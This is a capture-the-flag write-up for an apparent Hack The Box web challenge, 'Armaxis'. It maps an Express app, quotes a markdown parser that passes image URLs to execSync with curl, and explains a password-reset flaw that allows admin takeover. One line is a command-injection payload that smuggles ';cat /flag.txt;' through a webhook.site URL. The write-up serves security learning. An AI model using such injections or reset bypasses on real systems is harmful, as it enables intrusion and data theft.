# Armaxis

## Information Gathering

There are two ports available on the host `83.136.249.104`

- 32711 - challenge
- 48585 - email client for testing

There are two ports availabe on the host:
83.136.249.104

## Mapping the Application

### Entry Points

The challenge utilizes the Express Javascript library to create a web application. We can see where the routes are used in `challenge/index.js`

```js
app.use('/', routes);
```

The routes are located in `challenge/routes/index.js`. I used a regex to perform code extraction and get the paths for each URL:

```bash
$ cat challenge/routes/index.js | grep -E "^router\.(get|post)"
router.get("/", (req, res) => {
router.get("/reset-password", (req, res) => {
router.post("/register", async (req, res) => {
router.post("/login", async (req, res) => {
router.get("/logout", (req, res) => {
router.get("/weapons/dispatch", authenticate, (req, res) => {
router.post("/weapons/dispatch", authenticate, async (req, res) => {
router.get("/weapons", authenticate, async (req, res) => {
router.post("/reset-password/request", async (req, res) => {
router.post("/reset-password", async (req, res) => {
```

Some of the routes have a middleware function. The `authenticate` subroutine will execute for the `/weapons/dispath` and `/weapons` URL routes. 

### Major Components

I have a love hate relationship with web-applciations. I love them because the architecture is so easy to reverse engineer however, there are a lot of operations in HTTP and JS which works behind the scenes. Regardless, I'll quickly breakdown the components of this web application to map the attack surface.

**AuthN/AuthZ**

There is a authn (authentication) and authz (authorization) aspect of this web-application. Individuals can register accounts using identifiers (authn). In this case, the identifiers are an email and password. 

Additionally, there are actions which some users can perform that other can't (authz). We can interacte with the web application with different identies such as anonymous, regular user, and administrator.

This component is important because it implies that users have different permissions which is exactly the case in this challenge. You must have the `admin` role to use the `/weapons/dispatch` URL endpoint. 

We'll probably be looking for some sort of authentication bypass mechanism which brings me to my next component...

- https://www.cloudflare.com/learning/access-management/authn-vs-authz/
- https://portswigger.net/web-security/authentication
- https://www.strongdm.com/blog/authentication-vulnerabilities

**Session Management**

HTTP is a stateless protocol and thus, session information must be stored somewhere externally from the web server. This web-application utilizes JSON Web Tokens (JWT) for session identifiers. JWTs contain information about the user and what they can do (claims). JWTs themselves are secure, however bugs are typically introduced from bad application logic and implementation. 

The JWT logic is in `challenge/utils.js`. From quickly reviewing this file the logic looks solid. The token is verified correctly, a strong key is being used and stored securely, etc, etc etc...

- https://portswigger.net/web-security/jwt


## Information Leak

The administrator email is hard-coded into the source code at `challenge/database.js`

```js
await runInsertUser(
    "admin@armaxis.htb",
    `${crypto.randomBytes(69).toString("hex")}`,
    "admin",
);
```

## Potential Sinks

## Assets

## Components

### AuthN/AuthZ

From the /register endpoint, we are only able to create users with the role `user`

There is a password reset feature 

### Session Management

User sessions are managed by JWTs. 

The logic for this is in challenge/utils.js. The `authenticate` subroutine is bound to only three endpoints where two of the three endpoints require admin

### Database

There are three databases

users
weapons
password_resets

### Weapons

There are three endpoints which require us to be authenticated and have valid session

/weapons/dispatch - POST
/weapons/dispatch - GET
/weapons/ - GET

In the POST request to /weapons/dispatch, we can send information regarding a weapon. You can attach a note to it in markdown format which will then get parsed:
```js
function parseMarkdown(content) {
    if (!content) return '';
    return md.render(
        content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
            try {
                const fileContent = execSync(`curl -s ${url}`);
                const base64Content = Buffer.from(fileContent).toString('base64');
                return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
            } catch (err) {
                console.error(`Error fetching image from URL ${url}:`, err.message);
                return `<p>Error loading image: ${url}</p>`;
            }
        })
    );
}
```

If we can pass the regex, we can get code execution with the `execSync` function.

![4-the-lulzz](https://webhook.site/4ec99cb2-5117-4d57-a73d-efc598cef996?q=;cat+/flag.txt;)

## Privilege Escalation
The `/reset-password` URL endpoint does not associate a password reset token with an email. 
```js
router.post("/reset-password", async (req, res) => {
  const { token, newPassword, email } = req.body; // Added 'email' parameter
  if (!token || !newPassword || !email)
    return res.status(400).send("Token, email, and new password are required.");

  try {
    const reset = await getPasswordReset(token); // check token in db
    if (!reset) return res.status(400).send("Invalid or expired token.");

    const user = await getUserByEmail(email); // get user from email
    if (!user) return res.status(404).send("User not found.");

    await updateUserPassword(user.id, newPassword);
    await deletePasswordReset(token);

    res.send("Password reset successful.");
  } catch (err) {
    console.error("Error resetting password:", err);
    res.status(500).send("Error resetting password.");
  }
});
```
We can submit a password reset for any account, then intercept the request for actually sending the new password. We can then put the admin email into the account field. This will pass the `getPasswordReset` check and reset the administrator password for us.

